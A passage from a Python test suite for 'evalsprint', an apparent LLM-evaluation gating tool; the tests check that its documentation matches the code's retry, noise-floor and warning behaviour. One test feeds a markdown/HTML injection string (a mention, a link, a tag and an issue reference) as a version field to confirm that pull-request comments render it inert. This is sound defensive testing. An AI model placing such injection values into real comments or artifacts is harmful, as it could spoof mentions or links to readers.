        self.each(("README.md", "docs/ARCHITECTURE.md", "templates/github/README.md"), r"(?i)--retry-errors.{0,200}crashed attempts", "--retry-errors re-runs crashed attempts")

    def test_target_retries_default_limit_and_the_idempotence_warning(self):
        from evalsprint import config as cfg

        self.assertEqual((cfg.DEFAULT_TARGET_RETRIES, cfg.MAX_TARGET_RETRIES), (1, 5))
        with self.assertRaises(ValueError):
            cfg._int_setting(6, "target_retries", 0, cfg.MAX_TARGET_RETRIES)
        self.assertEqual(cfg._int_setting(5, "target_retries", 0, cfg.MAX_TARGET_RETRIES), 5)
        self.each(tuple(self.SPOTS), r"idempotent", "a target that is not idempotent")
        self.each(tuple(n for n in self.SPOTS if n != "docs/SPRINT_PLAYBOOK.md"), r"(?i)(at most|max(imum)?( of)?) 5", "at most 5 retries")
        self.each(("README.md", "docs/ARCHITECTURE.md", "templates/eval.yaml", "docs/SPRINT_PLAYBOOK.md", "templates/github/README.md"), r"target_retries: 0|`0` (switches it off|for a feature)|0 switches it off|set `0`", "target_retries: 0 for such a target")
        self.each(("README.md", "docs/ARCHITECTURE.md", "templates/github/README.md"), r"(?i)(paid|paid call)", "retries are paid")

    def test_the_placeholder_definition_is_the_one_the_code_uses(self):
        from evalsprint import runner

        def reason(target, judges):
            return runner.placeholder_reason(types_namespace(target={"callable": target}, judges=judges))

        self.assertIsNotNone(reason("anywhere/adapter.py:offline_stub", []))
        self.assertIsNotNone(reason("adapter.py:real", [{"type": "llm", "provider": "mock"}]))
        self.assertIsNone(reason("adapter.py:real", [{"type": "llm"}]))  # the default provider is a real one
        self.assertIsNone(reason("adapter.py:real", [{"type": "contains", "value": "x"}]))
        self.each(("README.md", "docs/ARCHITECTURE.md", "templates/github/README.md", "templates/eval.yaml", "CHANGELOG.md"), r"function named `offline_stub`", "a function named offline_stub")
        self.each(("README.md", "docs/ARCHITECTURE.md", "templates/github/README.md", "templates/eval.yaml", "CHANGELOG.md"), r"provider `mock`", "an LLM judge with the provider mock")
        self.each(("README.md", "docs/ARCHITECTURE.md", "templates/github/README.md"), r"\$\{VAR\}` and `--set", "read after ${VAR} and --set")

    def test_per_tag_below_n_is_honoured_and_tags_with_per_tag_is_an_error(self):
        from evalsprint.config import parse_repeat
        from evalsprint.runner import _attempts_of
        from evalsprint.types import Case

        self.assertEqual(parse_repeat({"n": 5, "per_tag": {"cheap": 1}}), {"n": 5, "per_tag": {"cheap": 1}})
        self.assertEqual(_attempts_of(Case(id="a", input="x", tags=["cheap"]), 5, {"cheap": 1}), 1)
        self.assertEqual(_attempts_of(Case(id="b", input="x", tags=["other"]), 5, {"cheap": 1}), 5)
        with self.assertRaises(ValueError):
            parse_repeat({"n": 5, "tags": ["safety"], "per_tag": {"safety": 5}})
        self.each(("README.md", "docs/ARCHITECTURE.md", "templates/eval.yaml"), r"per_tag: \{cheap: 1\}", "the per_tag below n example")
        self.each(("README.md", "docs/ARCHITECTURE.md", "templates/eval.yaml"), r"(?i)`tags` and `per_tag` together (are|is) a configuration error|naming `tags` and # `per_tag` together is a configuration error|naming `tags` and `per_tag` together is a configuration error", "tags with per_tag is an error")

    NOISE_DOCS = {
        "README.md": ("README.md",),
        "docs/METHODOLOGY.md": ("docs", "METHODOLOGY.md"),
        "docs/ARCHITECTURE.md": ("docs", "ARCHITECTURE.md"),
        "docs/SPRINT_PLAYBOOK.md": ("docs", "SPRINT_PLAYBOOK.md"),
        "templates/github/README.md": ("evalsprint", "templates", "github", "README.md"),
        "templates/eval.yaml": ("evalsprint", "templates", "eval.yaml"),
        "CHANGELOG.md": ("CHANGELOG.md",),
    }

    @classmethod
    def noise_docs(cls) -> dict[str, str]:
        return {name: " ".join(read_doc(*parts).replace("**", "").split()) for name, parts in cls.NOISE_DOCS.items()}

    def test_the_noise_command_is_described_as_it_computes(self):
        """C21 (loop-back 1): `evalsprint noise` prices the whole gate for the run's protocol; the docs say what the code does."""
        from evalsprint import cli

        self.assertEqual(cli.NOISE_MIN_REPEATED, 20)
        source = " ".join((ROOT / "evalsprint" / "cli.py").read_text(encoding="utf-8").split())
        for phrase in ("whole gate", "not estimated", "upper 95% bound", "assumed to be the noise of every case", "a tie as a fail", "no pass rate in the run", "Read every figure as"):
            with self.subTest(code=phrase):
                self.assertIn(phrase, source)
        for gone in ("pessimistic", "rule of three", "rule-of-three", "per-attempt noise stands in"):  # the behaviour before C21, in the code
            with self.subTest(code_without=gone):
                self.assertNotIn(gone, source)
        docs = self.noise_docs()
        for name in ("README.md", "docs/ARCHITECTURE.md", "templates/github/README.md"):  # the three docs that describe the command in full
            for pattern, what in (
                (r"whole gate", "it prices the whole gate"),
                (r"(?i)not estimated", "below 20 repeated cases it prints `not estimated`"),
                (r"(?i)at least 20 repeated cases", "the 20-case floor"),
                (r"(?i)upper 95%", "a flip rate of 0 is priced at the upper 95% bound"),
                (r"noise measured on the repeated cases (is|as) the noise of every case", "the assumption of one noise for every case"),
                (r"--gate PATH", "the gate it prices can be named"),
                (r"(?i)a tie as a fail", "the even-k note"),
                (r"(?i)odd (`n`|number|\w+ )?.{0,20}\(?3, 5\)?|3 or 5 attempts", "odd n stays the recommendation"),
                (r"(?i)noise of one \*{0,2}attempt|per attempt", "it converts the flip rate to the noise of one attempt"),
                (r"(?i)scaffold", "what the 10 cases of the init scaffold give"),
            ):
                with self.subTest(doc=name, statement=what):
                    self.assertRegex(docs[name], pattern)
        for name, text in docs.items():
            with self.subTest(doc=name, what="the words of the version before C21 are gone"):
                for gone in ("rule-of-three bound", "3 / repeated cases", "only when every case of the run was repeated", "prices the pass-rate rule only", "per-attempt noise is used as a bound", "pass-rate rule only"):
                    self.assertNotIn(gone, text)
                allowed = 1 if name == "docs/METHODOLOGY.md" else 0  # the methodology quotes the claim it does not make: "its figure is a pessimistic bound"
                self.assertEqual(text.count("pessimistic bound"), allowed)
                self.assertNotRegex(text, r"(?i)(?<!its )(figure|noise|rate)s? (is|are) (used as )?a pessimistic")
        self.assertRegex(docs["docs/METHODOLOGY.md"], r"or \"its figure is a pessimistic bound\"\.")
        self.assertIn("`--gate-config` is the same flag", docs["README.md"])

    def test_every_description_of_the_noise_command_says_what_it_needs(self):
        """A doc that tells the reader what `evalsprint noise` does must also say that it needs 20 repeated cases (the init scaffold has 10)."""
        mention = re.compile(r"evalsprint noise|noise RUN")
        other_command = re.compile(r"evalsprint (init|describe|run|compare|report|history|calibrate|label|baseline)\b")
        need = re.compile(r"(?i)at least 20|20 or more|20\+|20 repeated|fewer than 20|from 20 repeated")
        seen = 0
        for name, text in self.noise_docs().items():
            for found in mention.finditer(text):
                around = text[max(0, found.start() - 110) : found.end() + 110]
                if other_command.search(around):  # a list of commands or the CLI block, not a description
                    continue
                seen += 1
                with self.subTest(doc=name, at=found.start(), context=around[60:200]):
                    self.assertRegex(text[max(0, found.start() - 400) : found.end() + 1500], need)
        self.assertGreaterEqual(seen, 10, "the scan found too few descriptions: the rule is not being applied")

    def test_every_statement_of_the_20_case_floor_says_the_number_the_code_uses(self):
        """C21, C25b: each doc says the floor several times; a presence check of one of them lets a changed or blurred mention through, so every
        mention is read: `at least N repeated cases`, `from N repeated cases`, `fewer than N repeated cases` and `needs ... repeated cases` must
        carry the number of `cli.NOISE_MIN_REPEATED`."""
        from evalsprint import cli

        floor = str(cli.NOISE_MIN_REPEATED)
        numbered = re.compile(r"(?i)\b(?:at least|from|fewer than|below|under) (\w+\+?) repeated cases")
        needs = re.compile(r"(?i)\bneeds?\b[^.;:()]{0,14}repeated cases")
        seen = 0
        for name, text in self.noise_docs().items():
            for found in numbered.finditer(text):
                seen += 1
                with self.subTest(doc=name, mention=text[max(0, found.start() - 30) : found.end() + 10]):
                    self.assertEqual(found.group(1), floor)
            for found in needs.finditer(text):
                seen += 1
                with self.subTest(doc=name, mention=found.group(0)):
                    self.assertRegex(found.group(0), r"\b20\+?\b")
        self.assertGreaterEqual(seen, 35, "the scan found too few statements of the floor: the rule is not being applied")

    def test_every_description_keeps_its_statement_that_the_noise_of_repeated_cases_is_taken_for_every_case(self):
        """C21, C25b: the one-noise-for-every-case assumption is stated in several places of a doc; the count is locked, so that a mention that is
        reworded into something else (`it assumes nothing about the noise of the other cases`) is noticed. A new mention must be added to the table."""
        statement = re.compile(r"(?i)noise measured on (?:the repeated|those) cases?[^.;]{0,40}?every case")
        expected = {"README.md": 3, "docs/METHODOLOGY.md": 2, "docs/ARCHITECTURE.md": 1, "docs/SPRINT_PLAYBOOK.md": 1, "templates/github/README.md": 3, "CHANGELOG.md": 1}
        docs = self.noise_docs()
        for name, count in expected.items():
            with self.subTest(doc=name):
                self.assertEqual(len(statement.findall(docs[name])), count, f"{name}: a statement of the assumption was changed, removed or added (update the table if it was added)")
        for name, text in docs.items():
            with self.subTest(doc=name, what="no sentence says that the noise measured on the repeated cases is not assumed for the others"):
                self.assertNotRegex(text, r"(?i)assumes nothing about the noise")

    def test_every_mention_of_the_scaffold_cases_says_what_noise_gives_for_them(self):
        """C21, C25b: `evalsprint noise` prints `not estimated` for the 10 cases of the `init` scaffold (below `NOISE_MIN_REPEATED`); every mention
        of those 10 cases in a doc that describes the command says so, or says that they are below the floor, or says what to do instead."""
        saying = re.compile(r"(?i)not estimated|below it|in that situation|repeat every case of a suite of 20")
        seen = 0
        for name, text in self.noise_docs().items():
            for found in re.finditer(r"(?i)10 cases of the (?:`[^`]+` )?scaffold", text):
                seen += 1
                with self.subTest(doc=name, mention=text[found.start() : found.end() + 90]):
                    self.assertRegex(text[max(0, found.start() - 120) : found.end() + 120], saying)
                    self.assertNotRegex(text[found.start() : found.end() + 90], r"(?i)give a rate|give figures|are enough")
        self.assertGreaterEqual(seen, 8, "the scan found too few mentions of the scaffold: the rule is not being applied")

    def test_exit_code_3_is_counted_per_case_or_per_attempt_and_the_readme_says_so(self):
        """README exit-code line for 3: the attempt error rate counts too (a majority vote cannot hide crashed attempts)."""
        from evalsprint import cli

        # 30 cases, 90 attempts, no case errored but a fifth of the attempts crashed: unhealthy by the attempt error rate only
        summary = {"n_cases": 30, "n_errors": 0, "error_rate": 0.0, "n_attempts": 90, "n_attempt_errors": 18, "attempt_error_rate": 0.2, "n_scored": 30}
        unhealthy, why = cli._health(summary, {"max_error_rate": 0.05})
        self.assertTrue(unhealthy, why)
        self.assertFalse(cli._health(dict(summary, n_attempt_errors=0, attempt_error_rate=0.0), {"max_error_rate": 0.05})[0])
        self.each(("README.md",), r"`3` unhealthy run \(`run`, when the error rate is above `max_error_rate`, counted per case or per attempt, so the attempt error rate also counts", "the README line for exit code 3")
        self.each(("docs/ARCHITECTURE.md",), r"`3` unhealthy run \(`run` when `error_rate` or `attempt_error_rate` is above `max_error_rate`", "the ARCHITECTURE line for exit code 3")
        self.each(("templates/github/README.md",), r"above this \(per case or per attempt\) the run is unhealthy \(exit 3\)", "the workflow README gate block")

    def test_the_playbook_does_not_hand_over_the_noise_command_as_exact_rates(self):
        """C25a, C25b: the handover quotes the exact tables and the measured flip rate; `evalsprint noise` output goes with its assumptions."""
        playbook = self.docs["docs/SPRINT_PLAYBOOK.md"]
        self.assertNotRegex(playbook, r"(?i)states the exact rates, from `?evalsprint noise`?")
        self.assertNotRegex(playbook, r"(?i)exact rates[^.]{0,40}from `?evalsprint noise")
        self.assertRegex(playbook, r"the handover states the exact rates from the tables \(workflow README, section 9\) together with the flip rate")
        self.assertIn("summary.stability.flip_rate", playbook)
        self.assertIn("The output of `evalsprint noise` goes into the handover only with the flip rate and its assumptions, and not as the suite's rates", playbook)
        self.assertIn("it prices the whole gate for the run's own repeat protocol, \"about\", from at least 20 repeated cases", playbook)
        self.assertNotIn("is not handed over as the suite's rates", playbook)
        self.assertNotIn("prices the pass-rate rule only", playbook)


class LoopbackDocsTests(unittest.TestCase):
    """C25b (loop-back 1): what the docs say about the behaviour shipped by C21 to C26 is tied to the code that does it.

    The numbers come from `scripts/gate_numbers.py` and are cross-checked against the evaluation scientist's own files and against the decision of
    `compare_runs`; the wording is checked against the strings the code prints. `DocClaimsTests` scans the decimal percentages of every doc.
    """

    @classmethod
    def setUpClass(cls):
        cls.gn = shared_gate_numbers()
        cls.docs = PlatformDocsTests.noise_docs()

    # ------------------------------------------------------------------ C22: retries

    def test_the_retry_share_warning_is_recomputed_decided_the_way_compare_decides_it_and_stated(self):
        import itertools

        from evalsprint.gate_defaults import DEFAULT_GATE
        from tests.test_compare import retry_compare

        rate = self.gn.retry_share_warning_rate

        def brute(n, f_base, f_cand, retries, limit):  # every combination of repeats of every call, no convolution
            def one(f):
                return [f**j * (1 - f) for j in range(retries)] + [f**retries]

            total = 0.0
            for kb in itertools.product(range(retries + 1), repeat=n):
                for kc in itertools.product(range(retries + 1), repeat=n):
                    if (sum(kc) - sum(kb)) / n >= limit - 1e-9:
                        total += math.prod(one(f_base)[k] for k in kb) * math.prod(one(f_cand)[k] for k in kc)
            return total

        for args in ((3, 0.3, 0.6, 2, 1 / 3), (4, 0.1, 0.5, 1, 0.25), (3, 0.0, 0.5, 1, 1 / 3), (4, 0.05, 0.05, 1, 0.5)):
            with self.subTest(brute_force=args):
                self.assertAlmostEqual(rate(*args), brute(*args), places=12)
        # the decision of the comparison: at 100 calls, 10 more retried calls than the baseline warn, 9 do not (default `retry_share_warn` 0.10)
        self.assertEqual(DEFAULT_GATE["retry_share_warn"], 0.10)
        for base_used, cand_used, warns in ((0, 10, True), (0, 9, False), (5, 15, True), (5, 14, False), (20, 5, False)):
            with self.subTest(base_used=base_used, cand_used=cand_used):
                found = retry_compare(base_used=base_used, cand_used=cand_used)
                self.assertEqual(any("retried its target" in w for w in found["warnings"]), warns)
                self.assertEqual(found["verdict"], "pass", "the share warning never blocks")

        def shown(x, digits=1):
            return f"{x * 100:.{digits}f}%"

        self.assertEqual([shown(rate(100, 0.05, 0.05), 2), shown(rate(100, 0.05, 0.10)), shown(rate(100, 0.05, 0.20)), shown(rate(100, 0.05, 0.50), 0)], ["0.12%", "11.2%", "88.8%", "100%"])
        self.assertEqual([shown(rate(45, 0.05, 0.05), 2), shown(rate(100, 0.0, 0.10)), shown(rate(100, 0.0, 0.20)), shown(rate(100, 0.0, 0.50), 0)], ["1.51%", "54.9%", "99.8%", "100%"])
        self.assertEqual([shown(rate(100, 0.05, 0.05, 1, 0.075), 2), shown(rate(100, 0.05, 0.10, 1, 0.075)), shown(rate(100, 0.05, 0.10, 1, 0.15), 2)], ["0.77%", "24.7%", "0.61%"])
        measured = ROOT / "orchestration" / "2026-09-29_kit-v0.2" / "cycle4" / "loopback1" / "eval-scientist-gate" / "retry_share_warn_measure.json"
        if measured.exists():  # the evaluation scientist's own computation of the same sums
            data = json.loads(measured.read_text(encoding="utf-8"))
            for key, (n, f_base), f_cand, limit in (
                ("retries1_N100_baseline0.05", (100, 0.05), 0.1, 0.1),
                ("retries1_N100_baseline0.05", (100, 0.05), 0.2, 0.1),
                ("retries1_N100_baseline0.0", (100, 0.0), 0.1, 0.1),
                ("retries1_N45_baseline0.05", (45, 0.05), 0.05, 0.1),
                ("retries1_N100_baseline0.05", (100, 0.05), 0.1, 0.075),
                ("retries1_N100_baseline0.05", (100, 0.05), 0.1, 0.15),
            ):
                self.assertAlmostEqual(data[key][str(f_cand)][str(limit)], rate(n, f_base, f_cand, 1, limit), places=9)
        for name in ("README.md", "docs/METHODOLOGY.md", "docs/ARCHITECTURE.md", "templates/github/README.md"):
            with self.subTest(doc=name):
                for figure in ("0.12%", "11.2%", "88.8%"):
                    self.assertIn(figure, self.docs[name])
                self.assertRegex(self.docs[name], r"(?i)weak (warning )?for small increases|warning is weak for small increases|is weak for small increases")
        self.assertIn("0.12% false warnings at 100 calls", self.docs["CHANGELOG.md"])
        # the default of the warning, and what the default retry hides (whole numbers: `test_the_critics_two_measured_sentences...` recomputes them)
        self.assertIn("`retry_share_warn`, 10 percentage points, above the baseline's", self.docs["README.md"])
        self.assertIn("`retry_share_warn` (default 0.10, 10 p.p.;", self.docs["docs/ARCHITECTURE.md"])
        self.assertIn("is blocked in 11% of the runs (an unchanged one, 7%)", self.docs["README.md"])
        self.assertIn("is blocked in 11% of the runs and on 20% in 39% (an unchanged one, 7%)", self.docs["docs/METHODOLOGY.md"])
        self.assertIn("is blocked in 11% of the runs and one that crashes on 20% in 39% (an unchanged one: 7%)", self.docs["docs/ARCHITECTURE.md"])
        for name in ("docs/SPRINT_PLAYBOOK.md", "templates/eval.yaml"):
            with self.subTest(doc=name):
                self.assertIn("11 of 100", self.docs[name])
        self.assertIn("89 of 100", self.docs["docs/SPRINT_PLAYBOOK.md"])

    def test_target_retries_is_documented_the_way_compare_decides_it(self):
        from evalsprint.compare import to_markdown
        from tests.test_compare import retry_compare

        arch = self.docs["docs/ARCHITECTURE.md"]
        changed = retry_compare(1, 3)
        self.assertEqual((changed["verdict"], changed["target_retries_changed"]), ("regression", True))
        stem = changed["reasons"][0].split("):")[0].replace("baseline 1, candidate 3", "baseline B, candidate C") + ")"
        self.assertIn(stem, arch)  # target retries changed (target_retries: baseline B, candidate C)
        allowed = retry_compare(1, 3, gate={"allow_target_retries_change": True})
        self.assertEqual(allowed["reasons"], [])
        self.assertTrue(any("allowed by gate.allow_target_retries_change" in w for w in allowed["warnings"]))
        self.assertIn("a warning that names `gate.allow_target_retries_change`", arch)
        missing = retry_compare(None, 1)
        self.assertIsNone(missing["target_retries_changed"])
        self.assertTrue(any("re-create the baseline" in w for w in missing["warnings"]))
        self.assertRegex(arch, r"`target_retries_changed` is `null` and there is a warning that a change cannot be detected and that the baseline should be re-created; it never blocks")
        info = changed["target_retries"]
        self.assertEqual(set(info), {"baseline", "candidate", "changed"})
        self.assertEqual(set(info["baseline"]), {"configured", "retried_calls", "attempts", "share"})
        for key in sorted(set(info) | set(info["baseline"])):
            with self.subTest(key=key):
                self.assertIn(f'"{key}"', arch)
        seven = retry_compare(1, 1, cand_used=7)["target_retries"]["candidate"]
        self.assertEqual((seven["retried_calls"], seven["attempts"], seven["share"]), (7, 100, 0.07))
        self.assertIn("`share` is `retried_calls / attempts`", arch)
        md = to_markdown(retry_compare(1, 1, cand_used=3))
        self.assertIn("↻ Target retries:", md)
        self.assertIn("target retries unchanged", md)
        self.assertNotIn("↻ Target retries", to_markdown(retry_compare(1, 1)), "the line appears only when either run retried or the values differ")
        self.assertIn("`↻ Target retries: ...`", arch)
        self.assertIn("`target retries unchanged`", arch)
        self.assertIn("the comment adds one line with the configured value, the retries and their share of the calls for both runs", self.docs["templates/github/README.md"])
        # an explicit gate is authoritative: the pull request's own summary cannot allow the change
        from evalsprint.compare import compare_runs
        from tests.test_compare import build, flags, make_run

        base = make_run("base", build(flags(100)), target_retries=1)
        cand = make_run("cand", build(flags(100)), gate={"allow_target_retries_change": True}, target_retries=3)
        self.assertEqual(compare_runs(base, cand, gate={})["verdict"], "regression")
        self.assertIn("The pull request's own summary gate cannot allow the change", arch)
        for name in ("README.md", "docs/METHODOLOGY.md", "docs/ARCHITECTURE.md", "templates/github/README.md", "templates/eval.yaml"):
            with self.subTest(doc=name, what="a changed value blocks, unless allowed"):
                self.assertRegex(self.docs[name], r"allow_target_retries_change")

    # ------------------------------------------------------------------ C26: selection, the forged summary, the relabel help

    def test_selection_is_documented_as_the_code_writes_and_reads_it(self):
        from evalsprint import cli, runner

        limited = {"selection": {"limited": True, "n_selected": 2, "n_config": 6, "limit": 2, "tags": None, "ids": None}}
        self.assertIn("was limited", cli._selection_warning(limited, "r1"))
        self.assertIn("does not record which cases it covers", cli._selection_warning({}, "r1"))
        self.assertIsNone(cli._selection_warning({"selection": {"limited": False, "n_selected": 6, "n_config": 6}}, "r1"))
        keys = set(runner._selection(6, 2, None, None, 2))
        self.assertEqual(keys, {"limited", "n_selected", "n_config", "limit", "tags", "ids"})
        arch = self.docs["docs/ARCHITECTURE.md"]
        for key in sorted(keys):
            with self.subTest(key=key):
                self.assertIn(f"`{key}`", arch)
        for name in ("README.md", "docs/ARCHITECTURE.md", "docs/METHODOLOGY.md", "CHANGELOG.md"):
            with self.subTest(doc=name):
                self.assertRegex(self.docs[name], r"(?i)warns?,? without refusing")
                self.assertRegex(self.docs[name], r"(?i)does not record `?selection`?|does not record its selection")
        for name in ("README.md", "docs/ARCHITECTURE.md"):
            self.assertIn("summary.selection.limited", self.docs[name])
        source = (ROOT / "evalsprint" / "cli.py").read_text(encoding="utf-8")
        self.assertIn("should be a number but is", source)
        for name in ("README.md", "docs/ARCHITECTURE.md"):
            with self.subTest(doc=name, what="the forged summary field is named in one line"):
                self.assertIn("should be a number but is", self.docs[name])
                self.assertRegex(self.docs[name], r"one[- ]line error")

    # ------------------------------------------------------------------ C23: inert values, the judges_sha note

    def test_gate_md_prints_artifact_values_in_code_spans_as_the_docs_say(self):
        from evalsprint.compare import compare_runs, to_markdown
        from tests.test_compare import build, flags, make_run

        hostile = "@evil [x](http://e.example) <b>x</b> #123"
        base = make_run("base", build(flags(100)), evalsprint_version="0.2.0")
        cand = make_run("cand", build(flags(100)), evalsprint_version=hostile)
        found = compare_runs(base, cand)
        warning = next(w for w in found["warnings"] if "evalsprint version differs" in w)
        self.assertIn("@evil", warning, "the plain text keeps the value")
        self.assertTrue(hasattr(warning, "md"), "each reason and warning carries its `.md`")
        md = to_markdown(found)
        outside = re.sub(r"`[^`]*`", "", md)
        for bit in ("@evil", "http://e.example", "<b>", "#123"):
            with self.subTest(bit=bit):
                self.assertIn(bit, md)
                self.assertNotIn(bit, outside, "outside a code span the value would be live markdown")
        for name in ("README.md", "docs/ARCHITECTURE.md", "templates/github/README.md", "CHANGELOG.md"):
            with self.subTest(doc=name):
                self.assertRegex(self.docs[name], r"code spans?")
                self.assertRegex(self.docs[name], r"(?i)mentions")
        self.assertIn("`.md` of each reason and warning", self.docs["docs/ARCHITECTURE.md"])
        self.assertIn("`gate.json` and the CLI keep the plain text", self.docs["README.md"])

    def test_the_judges_sha_reason_of_a_v01_baseline_carries_the_custom_judge_note(self):
        from evalsprint.compare import compare_runs
        from tests.test_compare import build, flags, make_run

        def reason(baseline_version):
            base = make_run("base", build(flags(100)), judges_sha="aaaaaaaaaaaa", evalsprint_version=baseline_version)
            cand = make_run("cand", build(flags(100)), judges_sha="bbbbbbbbbbbb", evalsprint_version="0.2.0")
            return compare_runs(base, cand)["reasons"][0]

        self.assertIn("also hashes custom-judge code and data_files", reason("0.1.0"))
        self.assertNotIn("also hashes custom-judge code", reason("0.2.0"))
        for name in ("docs/ARCHITECTURE.md", "CHANGELOG.md"):
            with self.subTest(doc=name):
                self.assertIn("also hashes custom-judge code and `data_files`", self.docs[name])

    # ------------------------------------------------------------------ the list of what not to claim

    def test_the_do_not_claim_items_9_to_15_are_said_where_a_client_reads_them(self):
        meth = self.docs["docs/METHODOLOGY.md"].split("Not claimed", 1)[1]
        items = {
            9: "\"`evalsprint noise` gives your suite's false-alarm rate\", or \"its figure is a pessimistic bound\".",
            11: "\"`target_retries` makes crashes harmless\", or \"the gate shows crashes\".",
            12: "\"After a change, only the outputs that changed need a label.\" True only when the earlier labels covered every unchanged case.",
            13: "\"A perfect judge is certified with 40 labels\", or a label budget that ignores the human pass rate.",
            14: "The whole-gate figures as an independence approximation.",
            15: "That the tag-drop warning covers small tags.",
        }
        for number, anchor in items.items():
            with self.subTest(item=number, doc="docs/METHODOLOGY.md"):
                self.assertIn(anchor, meth)
        readme_limits = self.docs["README.md"].split("Limits, stated plainly", 1)[1]
        for number, anchor in {
            9: "`evalsprint noise` is a model of your suite, not a measurement of its false alarm.",
            11: "`target_retries` does not make crashes harmless, and the gate does not show every crash.",
            12: "\"After a change, only the outputs that changed need a label\" is true only when the earlier labels covered every unchanged case",
            15: "The tag-drop warning does not cover small tags.",
        }.items():
            with self.subTest(item=number, doc="README.md"):
                self.assertIn(anchor, readme_limits)
        with self.subTest(item=13, doc="README.md"):
            self.assertIn("is `trustworthy` in at least 80% of the runs only from 40, 48, 67 and 124 labels at 50%, 70%, 80% and 90% human pass respectively: that is the floor, not the plan.", readme_limits)
        workflow = self.docs["templates/github/README.md"].split("It is not", 1)[1].split("## 1. Add them", 1)[0]
        for number, anchor in {9: "A measurement of your suite's false alarm, in `evalsprint noise`.", 11: "A way to see every crash.", 15: "Coverage of small tags."}.items():
            with self.subTest(item=number, doc="templates/github/README.md"):
                self.assertIn(anchor, workflow)
        with self.subTest(item=11, doc="docs/SPRINT_PLAYBOOK.md"):
            self.assertIn("| The target crashes on some calls, or crashes more after a change |", self.docs["docs/SPRINT_PLAYBOOK.md"])
        # item 14: the independence figures are not quoted (`test_the_whole_gate_figures_are_exact_and_the_old_approximation_is_gone` checks the numbers)
        self.assertIn("(`total_false_alarm`) stays in the script only to show the difference, and no doc quotes it", meth)
        # item 15: the figures of the review (the file is its evidence), and the code: a tag of 19 paired cases never warns, one of 20 does
        c5 = ROOT / "orchestration" / "2026-09-29_kit-v0.2" / "cycle4" / "critic-methodology" / "c5_tag_warnings.json"
        if c5.exists():
            rows = {(r["layout"], r["noise"]): r for r in json.loads(c5.read_text(encoding="utf-8"))}
            ten, twenty = rows[("10 tags x 10 cases", "5%")], rows[("5 tags x 20", "5%")]
            self.assertEqual((f"{ten['any_warning_min10'] * 100:.1f}", ten["any_warning_min20"], f"{twenty['any_warning_min20'] * 100:.1f}", f"{rows[('5 tags x 20', '10%')]['any_warning_min20'] * 100:.1f}"), ("43.4", 0.0, "3.3", "14.8"))
        from evalsprint.gate_defaults import DEFAULT_GATE
        from tests.test_compare import compare, flags

        def warns(size):
            tags = lambda i: ["t"] if i < size else ["rest"]  # noqa: E731
            found = compare(flags(100), flags(100, fail=range(size)), base_kw={"tags": tags}, cand_kw={"tags": tags})
            return bool(found["tag_warnings"])

        self.assertEqual(DEFAULT_GATE["tag_drop_min_cases"], 20)
        self.assertEqual((warns(19), warns(20)), (False, True))
        for name in ("README.md", "docs/METHODOLOGY.md", "templates/github/README.md", "CHANGELOG.md"):
            with self.subTest(doc=name, item=15):
                self.assertIn("3.3%", self.docs[name])
                self.assertIn("14.8%", self.docs[name])

    def test_the_changelog_records_the_loopback_1_changes(self):
        text = self.docs["CHANGELOG.md"]
        added = text.split("### Added", 1)[1].split("### Changed", 1)[0]
        changed = text.split("### Changed", 1)[1].split("### Known limits", 1)[0]
        limits = text.split("### Known limits", 1)[1].split("## [0.1.0]", 1)[0]
        upgrade = text.split("### Upgrading from v0.1 to v0.2", 1)[1].split("\n### ", 1)[0]
        for phrase in (
            "`evalsprint noise RUN [--gate PATH | -c eval.yaml]`", "prices the whole gate", "at least 20 repeated cases", "not estimated", "upper 95% bound",
            "expected_gate_rates_protocol", "target_retries_changed", "retry_share_warn", "weak for small increases", "An inert PR comment", "gate.md",
        ):
            with self.subTest(added=phrase):
                self.assertIn(phrase, added)
        for phrase in ("`evalsprint baseline` warns, without refusing", "summary.selection.limited", "A `summary.json` with text where a number belongs", "`label --previous-labels` says when only the changed outputs need a label"):
            with self.subTest(changed=phrase):
                self.assertIn(phrase, changed)
        for phrase in ("8. `summary.target_retries` and `summary.selection` are new.", "does not record `target_retries`", "target_retries_changed", "allow_target_retries_change"):
            with self.subTest(upgrade=phrase):
                self.assertIn(phrase, upgrade)
        for phrase in ("`evalsprint noise` is a model of the suite", "`retry_share_warn` is a weak warning", "never covers a tag of fewer than 20 paired cases"):
            with self.subTest(limit=phrase):
                self.assertIn(phrase, limits)


def types_namespace(**kw):
    import types

    return types.SimpleNamespace(**kw)


class PlatformContractTests(unittest.TestCase):
    """Integration of the docs and templates with the platform contract (C17 to C20), driven through the real CLI.

    The docs describe `per_tag`, `target_retries`, `init` writing `.gitignore`, `summary.placeholder`, `evalsprint noise` and
    `label --previous-labels`. They are implemented by the platform executor (runner, config, CLI); these tests fail, on purpose and
    with a message that names the missing piece, if the docs promise something the installed CLI does not do. No skip: a doc that
    describes a feature nobody built must not pass as green.
    """

    @classmethod
    def setUpClass(cls):
        cls.env = {
            **{k: v for k, v in os.environ.items() if not k.startswith(("ANTHROPIC_", "OPENAI_", "EVALSPRINT_", "JUDGE_")) and k != "PYTHONPATH"},
            "PYTHONPATH": str(ROOT),
            "PYTHONUTF8": "1",
            "PYTHONDONTWRITEBYTECODE": "1",
        }

    def cli(self, cwd: Path, *args: str, extra_env: dict | None = None) -> subprocess.CompletedProcess:
        return subprocess.run([sys.executable, "-m", "evalsprint", *args], cwd=cwd, env={**self.env, **(extra_env or {})}, capture_output=True, text=True, encoding="utf-8")

    def scaffold(self, tmp: str) -> Path:
        work = Path(tmp)
        done = self.cli(work, "init")
        self.assertEqual(done.returncode, 0, done.stdout + done.stderr)
        return work

    def test_init_writes_a_gitignore_with_the_runs_and_the_label_secret_without_duplicates(self):
        """C18: `init` creates or extends `.gitignore` (the docs say `evalsprint init` already did it)."""
        with tempfile.TemporaryDirectory() as tmp:
            work = self.scaffold(tmp)
            lines = (work / ".gitignore").read_text(encoding="utf-8").splitlines()
            self.assertIn("runs/", lines)
            self.assertIn(".label_secret", lines)
            self.assertNotIn("evals/baseline/", "\n".join(lines), "the committed baseline must never be ignored")
            again = self.cli(work, "init")
            self.assertEqual(again.returncode, 0, again.stderr)
            after = (work / ".gitignore").read_text(encoding="utf-8").splitlines()
            self.assertEqual(sorted(after), sorted(lines), "a second init adds nothing")
        with tempfile.TemporaryDirectory() as tmp:  # an existing file is extended, never replaced, and a line that is there stays single
            work = Path(tmp)
            (work / ".gitignore").write_text("node_modules/\nruns/\n", encoding="utf-8")
            self.assertEqual(self.cli(work, "init").returncode, 0)
            lines = (work / ".gitignore").read_text(encoding="utf-8").splitlines()
            self.assertEqual(lines.count("runs/"), 1)
            self.assertEqual(lines.count(".label_secret"), 1)
            self.assertIn("node_modules/", lines)

    def test_the_documented_repeat_and_retry_lines_load(self):
